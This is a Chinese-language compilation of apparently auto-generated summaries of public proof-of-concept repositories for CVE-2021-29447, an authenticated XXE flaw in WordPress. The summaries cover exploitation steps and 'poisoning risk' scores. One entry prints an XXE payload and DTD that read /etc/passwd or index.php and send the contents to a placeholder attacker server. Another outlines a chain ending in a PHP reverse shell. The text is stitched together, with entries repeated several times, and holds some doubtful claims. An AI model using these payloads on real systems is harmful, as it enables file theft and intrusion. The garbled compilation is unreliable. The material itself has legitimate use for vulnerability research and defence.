4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

